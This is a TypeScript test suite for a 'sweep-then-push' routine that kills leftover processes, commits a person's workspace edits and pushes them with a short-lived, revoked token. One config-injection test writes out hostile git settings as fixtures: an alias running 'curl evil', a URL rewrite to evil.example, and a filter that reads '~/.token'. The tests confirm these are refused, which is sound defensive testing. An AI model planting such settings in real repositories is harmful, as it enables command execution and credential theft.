import { test } from "node:test";
import assert from "node:assert/strict";
import { appendFileSync, existsSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import {
  findSurvivors,
  personAuthor,
  sweepThenPush,
  SweepThenPushError,
  type SweepThenPushInput,
  type TraceEvent,
} from "./sweep-then-push.js";
import {
  BASELINE,
  BRANCH,
  FakeIssuer,
  FakeProcessControl,
  fixture,
  git,
  WINDKEEL,
  PERSON,
  PERSON_UID,
  personEdits,
  plantHooks,
  proc,
  RecordingWorkspace,
  TOKEN_VALUE,
  type Fixture,
} from "./fakes.js";
import { parseEnumeration } from "./vercel-workspace.js";

function setup(script: ConstructorParameters<typeof FakeProcessControl>[1] = {}) {
  const f = fixture();
  const log: string[] = [];
  const workspace = new RecordingWorkspace(log);
  const processes = new FakeProcessControl(log, script);
  const tokens = new FakeIssuer(log);
  const events: TraceEvent[] = [];
  const input: SweepThenPushInput = {
    runId: "r1",
    workspace,
    processes,
    policy: { personUids: [PERSON_UID], baseline: BASELINE },
    checkoutPath: f.checkout,
    repositoryUrl: f.remoteUrl,
    branch: BRANCH,
    seedSha: f.seedSha,
    person: PERSON,
    windkeel: WINDKEEL,
    tokens,
    closeSession: async () => {
      log.push("close-session");
    },
    readRemoteHead: async (branch) => {
      try {
        return git(f.root, "--git-dir", f.remote, "rev-parse", `refs/heads/${branch}`);
      } catch {
        return null;
      }
    },
    trace: (e) => events.push(e),
  };
  return { f, log, workspace, processes, tokens, events, input };
}

async function rejects(promise: Promise<unknown>, stage: string): Promise<SweepThenPushError> {
  try {
    await promise;
  } catch (error) {
    assert.ok(error instanceof SweepThenPushError, `expected SweepThenPushError, got ${error}`);
    assert.equal(error.stage, stage, error.message);
    return error;
  }
  assert.fail(`expected a refusal at ${stage}`);
}

function remoteHead(f: Fixture): string {
  return git(f.root, "--git-dir", f.remote, "rev-parse", `refs/heads/${BRANCH}`);
}

// --- ordering -------------------------------------------------------------------------------

test("order: session closed, swept, verified quiet, committed, swept+verified again, then token, push, remove, revoke", async () => {
  const { f, log, input, events } = setup();
  personEdits(f);
  const result = await sweepThenPush(input);
  assert.equal(result.kind, "pushed");

  const at = (entry: string) => log.indexOf(entry);
  const last = (entry: string) => log.lastIndexOf(entry);
  const mint = at("mint");
  const push = log.findIndex((e) => e === "exec:git push");
  assert.equal(at("close-session"), 0, "the session closes before anything else");
  assert.ok(at("sweep:ok") > at("close-session"));
  assert.ok(log.filter((e) => e === "sweep:ok").length === 2, "two sweeps, as the maker's capture");
  assert.ok(last("sweep:ok") < mint && log.lastIndexOf("snapshot:3") < mint, "token only after the final sweep and enumeration");
  assert.ok(log.findIndex((e) => e === "exec:git commit-tree") < last("sweep:ok"), "the commit is between the two sweeps");
  assert.ok(mint < push && push < at("exec:rm") && at("exec:rm") < at("revoke"));
  assert.deepEqual(
    events.map((e) => e.type),
    ["session-closed", "swept", "quiet", "git-config-ok", "committed", "swept", "quiet", "tree-verified", "token-minted", "token-installed", "pushed", "token-removed", "token-revoked", "remote-head-confirmed"],
  );
});

test("the token is never minted when the sweep cannot confirm, including the local-mode noSandbox answer", async () => {
  for (const sweep of [
    { ensured: false as const, reason: "still running after ten passes: 4242" },
    { ensured: false as const, reason: "host", noSandbox: true as const },
  ]) {
    const { f, input, tokens, log } = setup({ sweeps: [sweep] });
    personEdits(f);
    await rejects(sweepThenPush(input), "sweep");
    assert.equal(tokens.minted.length, 0);
    assert.ok(!log.some((e) => e.startsWith("exec:git")), "git never even reads config");
  }
});

test("a surviving process of the person's uid (a setsid'd daemon reparented to init) aborts before git runs", async () => {
  const { f, input, tokens, log } = setup({
    snapshots: [{ self: [900], processes: [...BASELINE, proc({ pid: 777, ppid: 1, comm: "node" })] }],
  });
  personEdits(f);
  const error = await rejects(sweepThenPush(input), "survivors");
  assert.match(error.message, /777\/node uid=1001 \(person-uid\)/);
  assert.equal(tokens.minted.length, 0);
  assert.ok(!log.some((e) => e.startsWith("exec:git")));
});

test("a survivor that appears only after the commit (final enumeration) aborts: no token, no push, remote untouched", async () => {
  const clean = { self: [900], processes: [...BASELINE] };
  const { f, input, tokens, log } = setup({
    snapshots: [clean, { self: [900], processes: [...BASELINE, proc({ pid: 778, comm: "code-server" })] }],
  });
  personEdits(f);
  await rejects(sweepThenPush(input), "survivors");
  assert.equal(tokens.minted.length, 0);
  assert.ok(!log.includes("exec:git push"));
  assert.equal(remoteHead(f), f.seedSha);
});

test("a new root process not in the hand-off baseline aborts (sudo'd daemon)", async () => {
  const { f, input, tokens } = setup({
    snapshots: [{ self: [900], processes: [...BASELINE, proc({ pid: 812, uid: 0, comm: "sleep" })] }],
  });
  personEdits(f);
  const error = await rejects(sweepThenPush(input), "survivors");
  assert.match(error.message, /not-in-baseline/);
  assert.equal(tokens.minted.length, 0);
});

test("a job scheduler in the workspace aborts — cron/at could start a process inside the push window", async () => {
  const cron = proc({ pid: 30, uid: 0, comm: "crond", startTime: "50" });
  const { f, input, tokens } = setup({ snapshots: [{ self: [900], processes: [...BASELINE, cron] }] });
  input.policy = { personUids: [PERSON_UID], baseline: [...BASELINE, cron] };
  personEdits(f);
  const error = await rejects(sweepThenPush(input), "survivors");
  assert.match(error.message, /scheduler/);
  assert.equal(tokens.minted.length, 0);
});

test("findSurvivors: ancestry, kernel threads, zombies and a reused pid", () => {
  const snapshot = {
    self: [900, 1],
    processes: [
      ...BASELINE,
      proc({ pid: 900, uid: PERSON_UID, comm: "sh" }), // our own exec chain
      proc({ pid: 55, ppid: 2, uid: 0, comm: "kworker/0:1" }),
      proc({ pid: 56, uid: 0, comm: "kthread", kernel: true }),
      proc({ pid: 61, state: "Z", comm: "defunct" }),
      { ...BASELINE[1]!, startTime: "99999" }, // pid 40 reused by something new
    ],
  };
  const found = findSurvivors(snapshot, { personUids: [PERSON_UID], baseline: BASELINE });
  assert.deepEqual(found.map((s) => [s.process.pid, s.reason]), [[40, "not-in-baseline"]]);
});

test("parseEnumeration reads the /proc listing script's output", () => {
  const snap = parseEnumeration("self= 812 40 1 \np 1 0 0 S 1 0 init\np 55 2 0 I 300 1 kworker/0:1\np 777 1 1001 S 5000 0 node\n");
  assert.deepEqual(snap.self, [812, 40, 1]);
  assert.deepEqual(snap.processes[2], { pid: 777, ppid: 1, uid: 1001, state: "S", startTime: "5000", kernel: false, comm: "node" });
  assert.equal(snap.processes[1]!.kernel, true);
});

// --- identity -------------------------------------------------------------------------------

test("author is the person's GitHub noreply identity, committer is Windkeel, parent is the seed", async () => {
  const { f, input } = setup();
  personEdits(f);
  const result = await sweepThenPush(input);
  assert.equal(result.kind, "pushed");
  if (result.kind !== "pushed") return;
  const raw = git(f.root, "--git-dir", f.remote, "cat-file", "commit", result.candidateSha);
  assert.match(raw, /^author The Octocat <583231\+octocat@users\.noreply\.github\.com> /m);
  assert.match(raw, /^committer Windkeel <factory@windkeel\.invalid> /m);
  assert.doesNotMatch(raw.split("\n").find((l) => l.startsWith("author "))!, /factory@windkeel\.invalid/);
  assert.equal(git(f.root, "--git-dir", f.remote, "rev-parse", `${result.candidateSha}^`), f.seedSha);
  assert.equal(result.author.email, "583231+octocat@users.noreply.github.com");
});

test("the person's own terminal commits — one even authored as WINDKEEL_GIT_AUTHOR_EMAIL — are folded into one commit by the person", async () => {
  const { f, input } = setup();
  writeFileSync(join(f.checkout, "a.ts"), "export const a = 9;\n");
  git(f.checkout, "-c", "user.name=Windkeel", "-c", `user.email=${WINDKEEL.email}`, "commit", "-qam", "spoofed as Windkeel");
  writeFileSync(join(f.checkout, "c.ts"), "x\n");
  git(f.checkout, "add", "c.ts");
  git(f.checkout, "-c", "user.name=Someone", "-c", "user.email=someone@example.com", "commit", "-qm", "another");
  const result = await sweepThenPush(input);
  if (result.kind !== "pushed") return assert.fail("expected a push");
  assert.equal(git(f.root, "--git-dir", f.remote, "rev-list", "--count", `${f.seedSha}..refs/heads/${BRANCH}`), "1");
  const authors = git(f.root, "--git-dir", f.remote, "log", "--format=%ae", `${f.seedSha}..refs/heads/${BRANCH}`);
  assert.equal(authors, "583231+octocat@users.noreply.github.com");
  assert.equal(git(f.root, "--git-dir", f.remote, "show", `${result.candidateSha}:a.ts`), "export const a = 9;");
});

test("personAuthor refuses a bad login or id, an email equal to Windkeel's, and falls back to the login for an unsafe name", () => {
  assert.throws(() => personAuthor({ githubId: 1, login: "bad login" }, WINDKEEL), /not a GitHub login/);
  assert.throws(() => personAuthor({ githubId: 1, login: "-x" }, WINDKEEL), /not a GitHub login/);
  assert.throws(() => personAuthor({ githubId: 0, login: "ok" }, WINDKEEL), /not a GitHub user id/);
  assert.throws(
    () => personAuthor({ githubId: 1, login: "windkeel" }, { name: "Windkeel", email: "1+windkeel@users.noreply.github.com" }),
    /WINDKEEL_GIT_AUTHOR_EMAIL/,
  );
  assert.deepEqual(personAuthor({ githubId: 7, login: "a-b", name: "Eve <windkeel@x>" }, WINDKEEL), {
    name: "a-b",
    email: "7+a-b@users.noreply.github.com",
  });
});

// --- what is pushed -------------------------------------------------------------------------

test("staged, unstaged and untracked edits are in the commit; ignored files are not; the remote holds exactly that commit", async () => {
  const { f, input } = setup();
  personEdits(f);
  const result = await sweepThenPush(input);
  if (result.kind !== "pushed") return assert.fail("expected a push");
  assert.equal(remoteHead(f), result.candidateSha);
  const files = git(f.root, "--git-dir", f.remote, "ls-tree", "-r", "--name-only", result.candidateSha).split("\n");
  assert.deepEqual(files.sort(), [".gitignore", "a.ts", "src/b.ts"]);
  assert.equal(git(f.root, "--git-dir", f.remote, "show", `${result.candidateSha}:a.ts`), "export const a = 3;", "the unstaged version wins: the worktree is the truth");
  assert.equal(result.nextState, "VERIFYING");
});

test("a write after the commit (an editor autosave that survived) is refused, not pushed outside the commit", async () => {
  let f!: Fixture;
  const ctx = setup({
    onSnapshot: (i) => {
      if (i === 1) appendFileSync(join(f.checkout, "a.ts"), "// autosave\n");
    },
  });
  f = ctx.f;
  personEdits(f);
  await rejects(sweepThenPush(ctx.input), "tree");
  assert.equal(ctx.tokens.minted.length, 0);
  assert.equal(remoteHead(f), f.seedSha);
});

test("no change means no token and no push", async () => {
  const { input, tokens, log } = setup();
  const result = await sweepThenPush(input);
  assert.equal(result.kind, "empty");
  assert.equal(tokens.minted.length, 0);
  assert.ok(!log.includes("exec:git push"));
});

test("hooks the person planted never run", async () => {
  const { f, input } = setup();
  personEdits(f);
  const markers = plantHooks(f);
  await sweepThenPush(input);
  for (const marker of markers) assert.ok(!existsSync(marker), `${marker} ran`);
});

test("config injection from the person's edits fails closed before any token: include.path, core.hooksPath, alias, url rewrite", async () => {
  for (const [key, value] of [
    ["include.path", "/tmp/elsewhere"],
    ["core.hooksPath", ".githooks"],
    ["alias.st", "!sh -c 'curl evil'"],
    ["url.https://evil.example/.insteadOf", "https://github.com/"],
    ["filter.x.clean", "sh -c 'cat ~/.token'"],
  ] as const) {
    const { f, input, tokens } = setup();
    personEdits(f);
    git(f.checkout, "config", key, value);
    await rejects(sweepThenPush(input), "git-config");
    assert.equal(tokens.minted.length, 0, key);
  }
});

test("a gitlink (nested repository) is refused rather than pushed as an unfetchable submodule", async () => {
  const { f, input, tokens } = setup();
  git(f.checkout, "init", "-q", "vendor/lib");
  writeFileSync(join(f.checkout, "vendor", "lib", "x"), "x");
  git(join(f.checkout, "vendor", "lib"), "add", "x");
  git(join(f.checkout, "vendor", "lib"), "-c", "user.name=a", "-c", "user.email=a@b", "commit", "-qm", "x");
  await rejects(sweepThenPush(input), "commit");
  assert.equal(tokens.minted.length, 0);
});

// --- the token ------------------------------------------------------------------------------

test("the token reaches the workspace only as a 0600 file outside the checkout, named to the push, never in argv", async () => {
  const { f, input, workspace, tokens, events } = setup();
  personEdits(f);
  await sweepThenPush(input);
  assert.ok(!workspace.argv.some((argv) => argv.some((a) => a.includes(TOKEN_VALUE))), "token in argv");
  const installed = events.find((e) => e.type === "token-installed");
  assert.ok(installed && installed.type === "token-installed");
  assert.ok(!installed.path.startsWith(f.checkout), "token file inside the checkout");
  assert.match(installed.path, /push-r1-[0-9a-f]{12}$/);
  assert.ok(!existsSync(installed.path), "token file left behind");
  assert.ok(workspace.argv.some((argv) => argv.join(" ") === `chmod 600 ${installed.path}`), "token file not 0600");
  const push = workspace.argv.find((argv) => argv.includes("push"))!;
  assert.ok(push.includes(`credential.helper=store --file ${installed.path}`));
  assert.ok(push.indexOf("credential.helper=") < push.indexOf(`credential.helper=store --file ${installed.path}`), "repo helpers reset first");
  assert.ok(!push.some((a) => a === "--force" || a === "-f" || a.startsWith("+")), "never forced");
  assert.ok(push.includes(`--force-with-lease=refs/heads/${BRANCH}:${f.seedSha}`), "leased to the seed");
  assert.match(tokens.purposes[0]!, /^windkeel-push:r1:[0-9a-f]{12}$/);
  assert.equal(tokens.revoked.length, 1, "revoked, not just deleted");
});

test("a failed push (branch moved since hand-off) still removes and revokes the token", async () => {
  const { f, input, tokens, events } = setup();
  personEdits(f);
  // Someone else advanced the branch: the person's commit is no longer a fast-forward.
  const moved = git(
    f.root, "--git-dir", f.remote, "-c", "user.name=Other", "-c", "user.email=o@example.com",
    "commit-tree", `${f.seedSha}^{tree}`, "-p", f.seedSha, "-m", "someone else's push",
  );
  git(f.root, "--git-dir", f.remote, "update-ref", `refs/heads/${BRANCH}`, moved);
  const error = await rejects(sweepThenPush(input), "push");
  assert.ok(!error.message.includes(TOKEN_VALUE));
  assert.equal(tokens.revoked.length, 1);
  const installed = events.find((e) => e.type === "token-installed");
  assert.ok(installed && installed.type === "token-installed" && !existsSync(installed.path));
  assert.equal(remoteHead(f), moved);
});

test("a branch deleted since hand-off is not recreated: the lease refuses, the token is removed and revoked", async () => {
  const { f, input, tokens, events } = setup();
  personEdits(f);
  git(f.root, "--git-dir", f.remote, "update-ref", "-d", `refs/heads/${BRANCH}`);
  const error = await rejects(sweepThenPush(input), "push");
  assert.ok(!error.message.includes(TOKEN_VALUE));
  assert.throws(() => remoteHead(f), "the branch stays deleted");
  assert.equal(tokens.revoked.length, 1);
  const installed = events.find((e) => e.type === "token-installed");
  assert.ok(installed && installed.type === "token-installed" && !existsSync(installed.path));
});

test("a branch rewound to an ancestor of the seed is not fast-forwarded past the rewind: the lease refuses", async () => {
  const { f, input, tokens } = setup();
  // The seed is a child of an earlier candidate, and the branch held it at hand-off ...
  writeFileSync(join(f.checkout, "a.ts"), "export const a = 10;\n");
  git(f.checkout, "-c", "user.name=Windkeel", "-c", `user.email=${WINDKEEL.email}`, "commit", "-qam", "candidate 2");
  const seed = git(f.checkout, "rev-parse", "HEAD");
  git(f.checkout, "push", "-q", f.remote, `HEAD:refs/heads/${BRANCH}`);
  input.seedSha = seed;
  personEdits(f);
  // ... then someone rewound it to the earlier candidate. Without a lease the push is a fast-forward.
  git(f.root, "--git-dir", f.remote, "update-ref", `refs/heads/${BRANCH}`, f.seedSha);
  await rejects(sweepThenPush(input), "push");
  assert.equal(remoteHead(f), f.seedSha, "the rewind stands");
  assert.equal(tokens.revoked.length, 1);
});

test("a throwing trace callback never skips the token's removal and revocation", async () => {
  const { f, input, tokens, workspace } = setup();
  personEdits(f);
  const paths: string[] = [];
  input.trace = (e) => {
    if (e.type === "token-installed") paths.push(e.path);
    throw new Error(`trace sink down at ${e.type}`);
  };
  const result = await sweepThenPush(input);
  assert.equal(result.kind, "pushed");
  assert.equal(remoteHead(f), result.candidateSha);
  assert.equal(tokens.minted.length, 1);
  assert.equal(tokens.revoked.length, 1);
  assert.equal(paths.length, 1);
  assert.ok(!existsSync(paths[0]!), "token file left behind");
  assert.ok(workspace.argv.some((argv) => argv[0] === "rm"));
});

test("a chmod failure after the token file is written still removes the file and revokes the token", async () => {
  const { f, input, tokens, workspace, log } = setup();
  personEdits(f);
  workspace.failChmod = true;
  const error = await rejects(sweepThenPush(input), "push");
  assert.match(error.message, /chmod/);
  const written = log.find((e) => e.startsWith("write:"))!.slice("write:".length);
  assert.ok(!existsSync(written), "token file left behind after a chmod failure");
  assert.ok(!existsSync(written.slice(0, written.lastIndexOf("/"))), "token directory left behind");
  assert.equal(tokens.revoked.length, 1);
  assert.ok(!log.includes("exec:git push"), "no push without a 0600 token file");
  assert.equal(remoteHead(f), f.seedSha);
});

test("a token file that cannot be removed is an error, and the token is revoked anyway", async () => {
  const { f, input, tokens, workspace } = setup();
  personEdits(f);
  workspace.failRm = true;
  const error = await rejects(sweepThenPush(input), "remove-token");
  assert.match(error.message, /destroy the workspace/);
  assert.equal(tokens.revoked.length, 1);
});

test("a push failure and a revoke failure are both reported; the push failure is the stage", async () => {
  const { f, input, tokens } = setup();
  personEdits(f);
  tokens.failRevoke = true;
  input.repositoryUrl = `file://${f.root}/does-not-exist.git`;
  const error = await rejects(sweepThenPush(input), "push");
  assert.match(error.message, /revoke failed/);
});

test("the remote head must equal the pushed SHA (the candidate-SHA handoff)", async () => {
  const { f, input } = setup();
  personEdits(f);
  input.readRemoteHead = async () => f.seedSha;
  await rejects(sweepThenPush(input), "remote-head");
});

test("a session that cannot be closed stops everything", async () => {
  const { f, input, log } = setup();
  personEdits(f);
  input.closeSession = async () => {
    throw new Error("API down");
  };
  await rejects(sweepThenPush(input), "session");
  assert.ok(!log.some((e) => e.startsWith("sweep")));
});
